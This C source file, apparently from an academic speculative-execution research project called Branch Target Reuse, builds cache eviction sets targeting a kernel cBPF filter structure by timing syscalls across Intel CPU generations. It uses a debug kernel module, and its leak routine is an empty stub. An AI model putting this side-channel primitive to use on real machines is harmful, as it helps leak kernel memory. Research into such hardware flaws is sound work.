/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 * Sander Wiebing
 */

#define _GNU_SOURCE

#include <pthread.h>
#include <string.h>
#include <stdatomic.h>

#include "common.h"
#include "targets.h"
#include "flush_and_reload.h"
#include "cbpf.h"
#include "evict.h"

#define DEBUG

#define BASE_SYSCALL 39
#define VICTIM_SYSCALL_NR 0x250

#define MAX_ITERATIONS 10000
#define PRINT_ITERATIONS 1000

#if defined(INTEL_10_GEN)

    //On the 10700k 8192 congurent addresses give a P of eviction = 0.99935
    #define EV_SET_SIZE                     (8192)
    #define EVICTION_BATCH_SIZE             10
    #define SYS_THRESHOLD_ADDITION          125
    #define EV_SET_MIN                      16
    #define ITERATIONS                      20

#elif defined(INTEL_13_GEN) || defined(INTEL_14_GEN) || defined(RAPTOR_COVE)

    #define EV_SET_SIZE                     (8192 * 10) // (8192 * 5)  // (196608 == 8192 * 24)
    #define EVICTION_BATCH_SIZE             100
    #define SYS_THRESHOLD_ADDITION          130 // 150 to high. 130 worked well, set size = 30!
    #define EV_SET_MIN                      5000
    #define ITERATIONS                      100

#elif defined(LION_COVE)

    #define EV_SET_SIZE                     (8192 * 10) // (8192 * 5)  // (196608 == 8192 * 24)
    #define EVICTION_BATCH_SIZE             100
    #define SYS_THRESHOLD_ADDITION          375 // 140 worked once. 180 too high
    #define EV_SET_MIN                      5000
    #define ITERATIONS                      100


#else
    #error "Not supported target"

    // silence other errors
    #define EV_SET_SIZE      0
    #define EVICTION_BATCH_SIZE             0
    #define SYS_THRESHOLD_ADDITION          0
    #define EV_SET_MIN                      0
    #define ITERATIONS                      0

#endif

#define EV_SET_MAP_SIZE (EV_SET_SIZE * PAGE_SIZE)

// #define TIME_DEBUG

//arguments
uint64_t ev_set_min = EV_SET_MIN;  //Default value
uint64_t sys_threshold = 0;

void * ev_set_walk[EV_SET_MIN];

uint8_t *pool;
ev_set_t global_queue;
ev_set_t bak_ev_set;

void ** global_ev_set_l3 = 0;

_Atomic uint8_t * ptr_filter_struct = 0;

static uint64_t measure_syscall(int syscall_nr)
{
    uint64_t t0 = rdtscp();
    asm volatile(
        "syscall\n"
        : "=a" (syscall_nr)
        : "a" (syscall_nr)
        : "r11", "rcx", "memory"
    );
    return rdtscp()-t0;
}

static void do_syscall(int syscall_nr)
{
    asm volatile(
        "syscall\n"
        : "=a" (syscall_nr)
        : "a" (syscall_nr)
        : "r11", "rcx", "memory"
    );
}

static int compare(const void *x, const void *y)
{
    return (*(uint64_t *)x - *(uint64_t *)y);
}

static void sort_ascending(uint64_t x[], unsigned n)
{
    qsort(x, n, sizeof(uint64_t), compare);
}

static void link_ev_set(void ** ev_set, int ev_set_size) {

    void **next;
	for (int i = 0; i < ev_set_size; i++) {
		next = ev_set[i];
		*next = ev_set[(i + 1) % ev_set_size];
	}

}

#if 0
void *alloc_contiguous_pages(void *addr, int split)
{
	char *p;
	uint64_t base;

	if (!addr) {
		// Find a suitable hugepage aligned address for our eviction buffer.
		p = (char *)mmap(NULL, 2*HUGE_PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
		if (p == (void *)-1) {
			pr_err("mmap: %s\n", strerror(errno));
			fail("alloc_contiguous_pages alignment mmap failed");
		}
		if (munmap(p, 2*HUGE_PAGE_SIZE) < 0) {
			pr_err("munmap: %s\n", strerror(errno));
			fail("alloc_contiguous_pages munmap failed");
		}
		base = (uint64_t)p;
		while (base % HUGE_PAGE_SIZE)
			base += PAGE_SIZE;
		addr = (void *)base;
	}

	assert((uint64_t)addr % HUGE_PAGE_SIZE == 0);

	// mmap the virtual memory at the chosen address.
	p = (char *)mmap(addr, HUGE_PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	if (p == (void *)-1) {
		pr_err("mmap: %s\n", strerror(errno));
		printf("alloc_contiguous_pages buf mmap failed\n");
        exit(1);
		// fail("alloc_contiguous_pages buf mmap failed");
	}
	if (p != addr) {
		// fail("alloc_contiguous_pages cant mmap that exact address");
		printf("alloc_contiguous_pages mprotect failed\n");
        exit(1);
    }


	// Turn it into a hugepage.
	if (madvise(p, HUGE_PAGE_SIZE, MADV_HUGEPAGE) < 0) {
		pr_err("madvise: %s\n", strerror(errno));
		// fail("alloc_contiguous_pages madvise failed");
		printf("alloc_contiguous_pages madvise failed\n");
        exit(1);
	}

	// Populate the hugepage, and check it is indeed huge.
	assert(get_rss_of_addr(p) == 0);
	*p = '\0';
	assert(get_rss_of_addr(p) == HUGE_PAGE_SIZE); // hugeness check

	if (split) {
		// Split the huge page table into 512 small page tables.
		if (mprotect(p + HUGE_PAGE_SIZE - PAGE_SIZE, PAGE_SIZE, PROT_READ) < 0) {
			pr_err("mprotect: %s\n", strerror(errno));
			printf("alloc_contiguous_pages mprotect failed\n");
            exit(1);
		}
	}

	return p;
}
#endif

void initialize_pool(uint64_t target) {

    uint8_t * addr;
    memset(&global_queue, 0, sizeof(global_queue));

    assert(EV_SET_MAP_SIZE % HUGE_PAGE_SIZE == 0);

    pool = mmap(NULL, EV_SET_MAP_SIZE + HUGE_PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    assert(pool != MAP_FAILED);
    assert(munmap(pool, EV_SET_MAP_SIZE + HUGE_PAGE_SIZE) == 0);

    addr = pool;
    while ((uint64_t) addr % HUGE_PAGE_SIZE) {
		addr += PAGE_SIZE;
    }
	assert((uint64_t)addr % HUGE_PAGE_SIZE == 0);

    pool = mmap((void *) addr, EV_SET_MAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);

    addr = pool;
    int n_huge_pages = 0;
    while (addr < pool + EV_SET_MAP_SIZE)
    {
        //now turn every page to a huge page one by one
        if (madvise(addr, HUGE_PAGE_SIZE, MADV_HUGEPAGE) < 0) {
            printf("madvise: %s\n", strerror(errno));
            printf("alloc_contiguous_pages madvise failed\n");
            exit(1);
        }
        n_huge_pages += 1;

        // Populate the hugepage, and check it is indeed huge.
        *(uint8_t *)addr = '\0';
        // printf("pool: %d\n", get_rss_of_addr(pool));
        // printf("addr: %d\n", get_rss_of_addr(addr));
        // assert(get_rss_of_addr(addr) == 0);
        // *(uint8_t *)addr = '\0';
        // printf("%d\n", get_rss_of_addr(addr));
        assert(get_rss_of_addr(pool) == (2048 * n_huge_pages)); // hugeness check
        // printf("Succeeded!\n");
        addr += HUGE_PAGE_SIZE;
    }

    for(int i=0; i<EV_SET_SIZE; i++) {
        pool[(i*0x1000)] = (uint8_t) rand(); //avoid memory deduplication
    }

    uint64_t page_offset = target & 0xfff;

    for(int i=0; i< EV_SET_SIZE; i++) {
        enqueue(&global_queue, &pool[ (i*0x1000) + page_offset]);
    }

}

void get_shuffled_array(int min, int max, int array[]) {

    for (int i = min; i < max; i++) {
        array[i] = i;
    }

    for (int i = min; i < max; i++) {
        int temp = array[i];
        int randomIndex = rand() % max;

        array[i]           = array[randomIndex];
        array[randomIndex] = temp;
    }
}

static void open_fds(struct config * cfg) {

    if (access(PATH_GET_AND_SET_FILTER_STRUCT, F_OK) == 0) {
        cfg->fd_get_filter_struct = open(PATH_GET_AND_SET_FILTER_STRUCT, O_RDONLY);
        assert(cfg->fd_get_filter_struct);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_GET_AND_SET_FILTER_STRUCT);
        exit(EXIT_FAILURE);
    }

    if (access(PATH_EVICT_FILTER_STRUCT, F_OK) == 0) {
        cfg->fd_evict = open(PATH_EVICT_FILTER_STRUCT, O_RDONLY);
        assert(cfg->fd_evict);
    } else {
        printf("Error: File %s not found. Please insert the kernel module\n", PATH_EVICT_FILTER_STRUCT);
        exit(EXIT_FAILURE);
    }

}

_Atomic uint64_t action = 0;
_Atomic uint8_t global_status = 0;
_Atomic uint8_t do_mistrain = 0;
_Atomic uint8_t do_load_data_path = 0;

static void * thread2_insert_program(void * arg) {
    struct config * cfg = (struct config *) arg;
    pin_to_core(LEAK_CORE);


    // insert_page_size_prog();
    usleep(100);
    ptr_filter_struct = (_Atomic uint8_t *) read_uint64_from_fd(cfg->fd_get_filter_struct);

    printf("ptr_filter_struct: %p THREAD2\n", ptr_filter_struct);

    action = 1;

    while (1)
    {
        usleep(100);
    }


    return NULL;

}


__always_inline static void do_evict_all(void ** ev_set_l2, ev_set_t * queue)
{
    for (size_t i = 0; i < 2; i++)
    {
        if (ev_set_l2) {
            evict(ev_set_l2);
            asm volatile("lfence");
        }
        if (global_ev_set_l3) {
            evict(global_ev_set_l3);
            asm volatile("lfence");
        }
        if (queue) {
            evict_ev_set(queue);
            asm volatile("lfence");
        }
    }

}


static uint8_t do_evict_and_time(struct config * cfg, int iterations, void ** ev_set_l2,
                            ev_set_t * queue, int do_print, uint64_t * med_time_res) {
    uint64_t q1_time, q3_time, med_time, min, max;
    uint64_t times[MAX_ITERATIONS];
    assert(iterations <= MAX_ITERATIONS);

    for(int i=0; i<iterations; i++) {

        asm volatile("mfence\n");
        do_syscall(VICTIM_SYSCALL_NR);
        cpuid();

        if (cfg->debug_evict) {
            read_uint64_from_fd(cfg->fd_evict);
        } else {
            do_evict_all(ev_set_l2, queue);
        }

        if (cfg->l3_debug_timing == 0) {
            do_syscall(BASE_SYSCALL);
            do_syscall(BASE_SYSCALL);
            cpuid();
        }

        if (cfg->l3_debug_timing) {
            times[i] = read_uint64_from_fd(cfg->fd_time_prog);
        } else {
            times[i] = measure_syscall(VICTIM_SYSCALL_NR);
        }
    }

    sort_ascending(times, iterations);

    med_time = times[iterations/2];

    if (med_time_res) {
        *med_time_res = med_time;
    }

    if (do_print) {

        q1_time = times[iterations/4];
        q3_time = times[iterations*3/4];
        min = times[0];
        max = times[iterations-1];

        printf(" | %3lu | %3lu | %3lu | %3lu | %3lu\n", min, q1_time, med_time, q3_time, max);
    }

    uint64_t threshold = cfg->l3_debug_timing ? 180 : sys_threshold;

    if(med_time < threshold) {
        return 1;
    }

    return 0;

}

void time_and_print(char * desc, struct config * cfg, int syscall_nr, uint8_t do_train, void ** ev_set_l2, ev_set_t * queue, uint64_t iterations) {
    uint64_t q1_time, q3_time, med_time, min, max;
    uint64_t hits;
    uint64_t t;
    uint64_t times[MAX_ITERATIONS];
    assert(iterations <= MAX_ITERATIONS);

    for(int i=0; i<iterations; i++) {

        asm volatile("mfence\n");
        do_syscall(VICTIM_SYSCALL_NR);
        cpuid();

        if (cfg->debug_evict) {
            read_uint64_from_fd(cfg->fd_evict_prog);
        } else {
            do_evict_all(ev_set_l2, queue);
        }

        if (cfg->l3_debug_timing == 0) {
            do_syscall(BASE_SYSCALL);
            do_syscall(BASE_SYSCALL);
            cpuid();
        }

        if (cfg->l3_debug_timing) {
            times[i] = read_uint64_from_fd(cfg->fd_time_prog);
        } else {
            times[i] = measure_syscall(VICTIM_SYSCALL_NR);
        }
    }

    sort_ascending(times, iterations);
    q1_time = times[iterations/4];
    med_time = times[iterations/2];
    q3_time = times[iterations*3/4];
    min = times[0];
    max = times[iterations-1];

    printf("[+] %-40s | %3lu | %3lu | %3lu | %3lu | %3lu\n", desc, min, q1_time, med_time, q3_time, max);
    fflush(stdout);
}

int reduce_eviction_set(struct config * cfg, ev_set_t * queue, int end_size) {

    int iter = 0;
    size_t tries = 0;
    size_t start_size = queue->size;
    uint8_t is_fast = 0;

    ev_set_t bak_queue;
    memset(&bak_queue, 0, sizeof(ev_set_t));

    while (queue->size > end_size)
    {
        if (queue->size % 10 == 0) {
            printf("\rSize: %5u  ", queue->size);
            fflush(stdout);
        }

        if (tries > start_size * 5) { // 3
            printf("\nFailed: tries exceed\n");
            return -1;
        }

        // get from bak queue if fast
        if (is_fast) {
            if (bak_queue.size == 0) {
                printf("\nFailed: bak_queue empty\n");
                do_evict_and_time(cfg, ITERATIONS, cfg->ev_set_l2, queue, 1, NULL);
                time_and_print("S | SUB Queue", cfg, VICTIM_SYSCALL_NR, 0, cfg->ev_set_l2, queue, 1000);
                do_evict_and_time(cfg, ITERATIONS, cfg->ev_set_l2, queue, 1, 0);
                return -1;
            }

            enqueue(queue, dequeue(&bak_queue));
            // printf("REC ");
            is_fast = do_evict_and_time(cfg, ITERATIONS, cfg->ev_set_l2, queue, 0, NULL);

            // cfg->l3_debug_timing = 1;
            // printf("    DEBUG        ");
            // do_evict_and_time(cfg, cfg->ev_set_l2, queue, 1);
            // cfg->l3_debug_timing = 0;
            continue;
        }

        tries += 1;

        // reduce set
        uint8_t * bak_ptr = dequeue(queue);

        is_fast = do_evict_and_time(cfg, ITERATIONS, cfg->ev_set_l2, queue, queue->size < 50, NULL);
        if (is_fast) {
            // printf("Enqueing bak_ptr\n");
            enqueue(queue, bak_ptr);
            is_fast = do_evict_and_time(cfg, ITERATIONS, cfg->ev_set_l2, queue, queue->size < 50, NULL);
        } else {
            enqueue_head(&bak_queue, bak_ptr);
        }
    }

    printf("Done! Size: %u", queue->size);

    do_evict_and_time(cfg, ITERATIONS, cfg->ev_set_l2, queue, 1, NULL);
    return 0;

}

#define STARTING_SIZE (L3_SETS / 64 * (L3_WAYS)) // + 6
// #define STARTING_SIZE 8060

void find_sub_eviction_set(struct config * cfg, uint64_t target, ev_set_t * sub_queue) {
    uint64_t page_offset = target & 0xfff;
    uint64_t tries = 0;
    uint8_t is_fast;
    ev_set_t bak_queue;
    int rand_array[EV_SET_SIZE];

    assert(STARTING_SIZE <= EV_SET_SIZE);

    memset(&bak_queue, 0, sizeof(ev_set_t));

    fflush(stdout);

    while (1)
    {
        memset(sub_queue, 0, sizeof(ev_set_t));
        get_shuffled_array(0, EV_SET_SIZE, rand_array);

        for(int i=0; i< STARTING_SIZE; i++) {
            enqueue(sub_queue, &pool[ (rand_array[i]*0x1000) + page_offset]);
        }

        is_fast = 0;
        for (size_t i = 0; i < 5; i++)
        {
           is_fast += do_evict_and_time(cfg, 1000, cfg->ev_set_l2, sub_queue, 0, NULL);
        }

        if (!is_fast) {
            break;
        }

        // uint8_t * pool_bak = pool;
        // initialize_pool((uint64_t) ptr_filter_struct);
        // assert(munmap(pool_bak, EV_SET_MAP_SIZE) == 0);
        tries++;
        printf("\rRetrying subset... Tries: %ld", tries);
        fflush(stdout);

    }

    printf("Found! Tries: %ld\n", tries);
    do_evict_and_time(cfg, ITERATIONS, cfg->ev_set_l2, sub_queue, 1, NULL);
    do_evict_and_time(cfg, ITERATIONS, cfg->ev_set_l2, sub_queue, 1, NULL);
    do_evict_and_time(cfg, ITERATIONS, cfg->ev_set_l2, sub_queue, 1, NULL);

}


// Fork and allocate 4k memory in module space
void fork_get_filter_pointer(struct config * cfg) {

    pid_t p;
    p = fork();
    if (p < 0) {
      perror("fork fail");
      exit(1);
    } else if (p > 0) {
        usleep(1000);
        return;
    }

    // child
    insert_allow_all_prog();

    open_fds(cfg);
    ptr_filter_struct = (_Atomic uint8_t *) read_uint64_from_fd(cfg->fd_get_filter_struct);
    fflush(stdout);
    printf("ptr_filter_struct: %p CHILD\n", ptr_filter_struct);
    while (1)
    {
        sleep(10);
    }

}

static void * thread_leak(void * arg) {
    struct config * cfg = (struct config *) arg;

    return NULL;

}



void find_l3_ev_set(struct config * cfg, uint64_t target, void ** ev_set_l2, void ** ev_set_l3) {
    uint64_t t;
    pthread_t tid;
    void *status;
    size_t med_time;
    ev_set_t sub_queue;
    ev_set_t bak_queue;

    printf("=================== Finding L3 SET ====================\n");

    memcpy(cfg->ev_set_l2, ev_set_l2, sizeof(cfg->ev_set_l2));

    initialize_pool((uint64_t) ptr_filter_struct);

    cfg->l3_debug_timing = 1;
    printf("[+] %-40s", "K | Cached");
    do_evict_and_time(cfg, 1000, NULL, NULL, 1, NULL);

    time_and_print("K | Evict L2", cfg, VICTIM_SYSCALL_NR, 0, cfg->ev_set_l2, NULL, 1000);
    time_and_print("K | Evict Global", cfg, VICTIM_SYSCALL_NR, 0, NULL, &global_queue, 1000);

    cfg->debug_evict = 1;
    time_and_print("K | Evict KFlush", cfg, VICTIM_SYSCALL_NR, 0, NULL, NULL, 1000);
    cfg->debug_evict = 0;

    printf("\n");

    cfg->l3_debug_timing = 0;
    printf("[+] %-40s", "S | Cached");
    do_evict_and_time(cfg, 1000, NULL, NULL, 1, &med_time);
    time_and_print("S | Evict L2", cfg, VICTIM_SYSCALL_NR, 0, (void **) cfg->ev_set_l2, NULL, 1000);
    time_and_print("S | Evict Global", cfg, VICTIM_SYSCALL_NR, 0, NULL, &global_queue, 1000);
    cfg->debug_evict = 1;
    time_and_print("S | Evict KFlush", cfg, VICTIM_SYSCALL_NR, 0, NULL, NULL, 1000);
    cfg->debug_evict = 0;
    printf("\n");

    sys_threshold = med_time + SYS_THRESHOLD_ADDITION;
    printf("THRESHOLD: %lu\n", sys_threshold);

retry_sub_set:
    cfg->l3_debug_timing = 0;
    find_sub_eviction_set(cfg, (uint64_t) ptr_filter_struct, &sub_queue);
    memcpy(&bak_queue, &sub_queue, sizeof(ev_set_t));


    for (size_t i = 0; i < 2; i++) {

        cfg->l3_debug_timing = 0;
        time_and_print("S | SUB Queue", cfg, VICTIM_SYSCALL_NR, 0, cfg->ev_set_l2, &sub_queue, 1000);
        printf("[+] %-40s", "S | SUB Queue");
        do_evict_and_time(cfg, 1000, cfg->ev_set_l2, &sub_queue, 1, NULL);
        cfg->l3_debug_timing = 1;
        time_and_print("K | SUB Queue", cfg, VICTIM_SYSCALL_NR, 0, cfg->ev_set_l2, &sub_queue, 1000);

    }

    cfg->l3_debug_timing = 0;
    if (reduce_eviction_set(cfg, &sub_queue, L3_EVICT_SIZE) == -1) {
        goto retry_sub_set;
    }
    printf("SET SIZE: %u\n", sub_queue.size);

    for (size_t i = 0; i < 2; i++) {
        cfg->l3_debug_timing = 0;
        time_and_print("S | Cached", cfg, VICTIM_SYSCALL_NR, 0, NULL, NULL, 1000);
        time_and_print("S | SUB Queue", cfg, VICTIM_SYSCALL_NR, 0, cfg->ev_set_l2, &sub_queue, 1000);
        cfg->l3_debug_timing = 1;
        time_and_print("K | Cached", cfg, VICTIM_SYSCALL_NR, 0, NULL, NULL, 1000);
        time_and_print("K | SUB Queue", cfg, VICTIM_SYSCALL_NR, 0, cfg->ev_set_l2, &sub_queue, 1000);

    }

    printf("---\n");
    // link
    int idx;
    idx = sub_queue.front;
    for(int i=0; i < sub_queue.size; i++) {
        uint8_t * addr = sub_queue.ptr[idx];
        ev_set_l3[i] = addr;
        idx = (idx + 1) % EV_SET_MAX;
    }
    link_ev_set(ev_set_l3, sub_queue.size);


    printf("---\n");

    for (size_t i = 0; i < 2; i++) {
        cfg->l3_debug_timing = 0;
        global_ev_set_l3 = NULL;
        time_and_print("S | Cached", cfg, VICTIM_SYSCALL_NR, 0, NULL, NULL, 1000);
        global_ev_set_l3 = ev_set_l3;
        time_and_print("S | ev_set_l3", cfg, VICTIM_SYSCALL_NR, 0, cfg->ev_set_l2, NULL, 1000);
        cfg->l3_debug_timing = 1;
        global_ev_set_l3 = NULL;
        time_and_print("K | Cached", cfg, VICTIM_SYSCALL_NR, 0, NULL, NULL, 1000);
        global_ev_set_l3 = ev_set_l3;
        time_and_print("K | ev_set_l3", cfg, VICTIM_SYSCALL_NR, 0, cfg->ev_set_l2, NULL, 1000);

    }

    fflush(stdout);

    return;

}
